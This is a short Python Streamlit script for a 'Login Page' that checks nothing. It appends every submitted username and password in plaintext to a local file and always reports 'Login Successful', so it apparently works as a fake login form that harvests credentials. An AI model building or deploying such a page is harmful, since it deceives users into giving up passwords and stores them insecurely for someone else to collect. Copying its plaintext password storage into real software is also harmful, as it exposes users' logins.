import streamlit as st

st.title('Login Page')

username = st.text_input('Username')
password = st.text_input('Password', type='password')

if st.button('Login'):
    with open('aarnav fort password', 'a') as file:
        file.write(f'Username: {username}, Password: {password}\n')
    
    st.write('Login Successful')
